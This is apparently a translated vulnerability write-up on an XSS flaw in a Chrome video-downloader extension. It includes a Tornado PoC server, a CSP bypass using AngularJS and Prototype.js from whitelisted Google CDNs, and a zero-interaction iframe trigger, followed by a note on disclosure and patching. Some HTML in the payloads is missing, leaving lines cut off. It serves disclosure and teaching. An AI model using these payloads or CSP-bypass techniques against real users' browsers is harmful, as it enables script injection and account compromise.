        if (!vd.isVideoLinkAlreadyAdded(
                vd.tabsData[tabId].videoLinks,
                videoLink.url
            ) &&
            videoLink.size > 1024 &&
            vd.isVideoUrl(videoLink.url)
        ) {
            vd.tabsData[tabId].videoLinks.push(videoLink);
            vd.updateExtensionIcon(tabId);
        }
    };
从现在起我们会开始遇到一些问题。我们需要将URL附加到`vd.tabsData[tabId].videoLinks`数组中，但只有当我们通过如下限制条件时才能做到这一点：
    !vd.isVideoLinkAlreadyAdded(
        vd.tabsData[tabId].videoLinks,
        videoLink.url
    ) &&
    videoLink.size > 1024 &&
    vd.isVideoUrl(videoLink.url)
`vd.isVideoLinkAlreadyAdded`只是一个简单的条件，判断`vd.tabsData[tabId].videoLinks`数组中是否已记录URL。第二个条件是判断`videoLink.size`是否大于`1024`。前面提到过，这个值来自于`Content-Length`头部字段。为了绕过检查条件，我们可以创建一个简单的Python Tornado服务器，然后创建一个通配路由，返回足够大的响应：
    ...trimmed for brevity...
    def make_app():
        return tornado.web.Application([
            ...trimmed for brevity...
            (r"/.*", WildcardHandler),
        ])
    ...trimmed for brevity...
    class WildcardHandler(tornado.web.RequestHandler):
        def get(self):
            self.set_header("Content-Type", "video/x-flv")
            self.write( ("A" * 2048 ) )
    ...trimmed for brevity...
由于我们使用的是通配型路由，因此无论我们构造什么链接，服务器都会返回大小`> 1024`的一个页面，这样就能帮我们绕过这个检查条件。
下一个检查则要求`vd.isVideoUrl`函数返回`true`，该函数代码如下所示：
    vd.videoFormats = {
        mp4: {
            type: 'mp4'
        },
        flv: {
            type: 'flv'
        },
        mov: {
            type: 'mov'
        },
        webm: {
            type: 'webm'
        }
    };
    vd.isVideoUrl = function(url) {
        var isVideoUrl = false;
        Object.keys(vd.videoFormats).some(function(format) {
            if (url.indexOf(format) != -1) {
                isVideoUrl = true;
                return true;
            }
        });
        return isVideoUrl;
    };
这个检查非常简单，只是简单地确保URL中包含`mp4`、`flv`、`mov`或者`webm`。只要在`url`载荷末尾附加一个`.flv`，我们就可以简单地绕过这个限制。
由于我们已经成功满足所有条件，因此我们的`url`会被附加到`vd.tabsData[tabId].videoLinks`数组中。
将目光重新转到原始的`popup.js`脚本，该脚本中包含前面分析的存在漏洞的核心函数，我们可以看到如下代码：
    $(document).ready(function() {
        var videoList = $("#video-list");
        chrome.tabs.query({
            active: true,
            currentWindow: true
        }, function(tabs) {
            console.log(tabs);
            vd.sendMessage({
                message: 'get-video-links',
                tabId: tabs[0].id
            }, function(tabsData) {
                console.log(tabsData);
                if (tabsData.url.indexOf('youtube.com') != -1) {
                    vd.sendMessage({
                        message: 'show-youtube-warning'
                    });
                    return
                }
                var videoLinks = tabsData.videoLinks;
                console.log(videoLinks);
                if (videoLinks.length == 0) {
                    $("#no-video-found").css('display', 'block');
                    videoList.css('display', 'none');
                    return
                }
                $("#no-video-found").css('display', 'none');
                videoList.css('display', 'block');
                videoLinks.forEach(function(videoLink) {
                    videoList.append(vd.createDownloadSection(videoLink));
                })
            });
        });
        $('body').on('click', '.download-button', function(e) {
            e.preventDefault();
            vd.sendMessage({
                message: 'download-video-link',
                url: $(this).attr('href'),
                fileName: $(this).attr('data-file-name')
            });
        });
    });
当用户点击浏览器中该插件图标时就会触发上述代码。插件会利用Chrome插件API来请求当前标签页的元数据（metadata），从元数据中获取的ID，然后将`get-video-links`调用发送到后台页面。负责这些操作的代码为`sendResponse(vd.getVideoLinksForTab(request.tabId));`，该代码会返回前面我们讨论过的视频链接。
插件会遍历这些视频链接，将每个链接传递给本文开头处提到过的`vd.createDownloadSection`函数。该函数会通过HTML拼接操作来生成一个较大的字符串，再由jQuery的[`.append()`](http://api.jquery.com/append/)函数附加到DOM中。将用户输入的原始HTML数据传到`append()`函数正是典型的跨站脚本（XSS）场景。
现在似乎我们可以将我们的载荷原封不动地传递到存在漏洞的函数中！然而现在想欢呼胜利还为时过早。我们还需要克服另一个困难：内容安全策略（Content
Security Policy，CSP）
###  内容安全策略
有趣的是，该插件所对应的CSP并没有在`script-src`指令中包含`unsafe-eval`，部分信息摘抄如下：
    script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *; object-src 'self'
从上述CSP中我们可以看到`script-src`指令的内容如下：
    script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com
这个策略会阻止我们引用任意站点的源代码，禁止我们使用内联JavaScript声明（比如``）。我们能执行JavaScript的唯一方法就是引用如下站点的源：
  * `https://www.google-analytics.com`
  * `https://ssl.google-analytics.com`
  * `https://apis.google.com`
  * `https://ajax.googleapis.com`
当我们想绕过CSP策略时，如果看到`script-src`指令中同时包含`https://apis.google.com`以及`https://ajax.googleapis.com`是非常好的一件事。这些站点上托管着许多JavaScript库，也包含JSONP端点：这两者对我们绕过CSP而言都非常有用。
> 注意：如果我们想判断某个站点是否不适合加入CSP中，可以使用一些天才的Google员工所开发的[CSP评估工具](https://csp-> evaluator.withgoogle.com/)，这里特别要感谢@we1x。
这里再说一些题外话，大家可以了解一下 [`H5SC Minichallenge 3: "Sh*t, it's
CSP!"`](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)比赛，其中参赛者必须在某个页面上获得XSS利用点，而该页面只将`ajax.googeapis.com`加入站点白名单中。这个[挑战](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#rules)与我们当前面临的处境非常相似。
这个挑战有多种解法，其中比较机智的解法是使用如下载荷：
    "ng-app ng-csp>{{$on.curry.call().alert(1337
提供该解法的参赛者提到如下一段话：
>
> 这种解法非常有趣，将Prototype.js与AngularJS结合起来就能实现滥用目标。AngularJS可以成功禁止用户使用其集成的沙盒来访问窗口，然而Prototype.JS使用了`curry`属性扩展了代码功能。一旦在该属性上使用`call()`调用，就会返回一个窗口对象，而AngularJS不会注意到这个操作。这意味着我们可以使用Prototype.JS来获取窗口，然后几乎可以执行该对象的所有方法。
>
> 在白名单中的Google-> CDN站点提供了比较过时的AngularJS版本以及Prototype.JS，这样我们就能访问窗口操作所需的数据，并且不需要用户操作就能完成该任务。
修改这个载荷后，我们也可以将其用在这个扩展上。如下载荷使用了相同的技术来执行`alert('XSS in Video Downloader for
Chrome by mandatory')`：
    "ng-app ng-csp>{{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')}}`方式引用插件中包含的任意资源。在这种情况下，我们需要包含的资源是`popup.html`页面。通常情况下，只有当用户点击插件图标时才会显示该页面。以``方式引用该页面，再配合我们之前构造的载荷后，我们就能获得无需用户交互的漏洞利用方式：
最终载荷如下所示：
        {{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')}}test
如上代码可以分为两部分：第一部分，为当前的标签页设置`videoLinks`数组。第二部分，在1秒后触发利用代码，设置`iframe`源地址为`chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html`（即popup页面）。最终PoC代码（包含Python服务器在内的所有代码）如下所示：
    import tornado.ioloop
    import tornado.web
    class MainHandler(tornado.web.RequestHandler):
        def get(self):
            self.write("""
        {{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')}}test
            """)
    class WildcardHandler(tornado.web.RequestHandler):
        def get(self):
            self.set_header("Content-Type", "video/x-flv")
            self.write( ("A" * 2048 ) )
    def make_app():
        return tornado.web.Application([
            (r"/", MainHandler),
            (r"/.*", WildcardHandler),
        ])
    if __name__ == "__main__":
        app = make_app()
        app.listen(8888)
        tornado.ioloop.IOLoop.current().start()
## 三、披露及缓解措施
由于我找不到该插件任何一名开发者的明显联系方式（Chrome插件页面上给出的联系方式非常有限），因此我联系了Google方面从事Chrome插件安全性研究的一些人。小伙伴们通知了插件开发者，及时推出了修复补丁。这两款插件的最新版都修复了本文提到的漏洞。与此同时，当使用该插件的用户自动更新插件版本后我们才发表这篇文章，因此大家应该都已打好补丁。
## 四、总结
如果大家有任何问题或者建议，可以随时[联系我](https://twitter.com/IAmMandatory)。如果想自己查找一些Chrome插件程序的漏洞，可以尝试使用我开发的[tarnish](https://thehackerblog.com/tarnish/)扫描器，应该能帮大家入门（工具源代码请访问[Github](https://github.com/mandatoryprogrammer/tarnish)）。如果想了解关于Chrome插件安全性方面的简介，可以参考“[Kicking
the Rims – A Guide for Securely Writing and Auditing Chrome
Extensions](https://thehackerblog.com/kicking-the-rims-a-guide-for-securely-writing-and-auditing-chrome-extensions/)”这篇文章。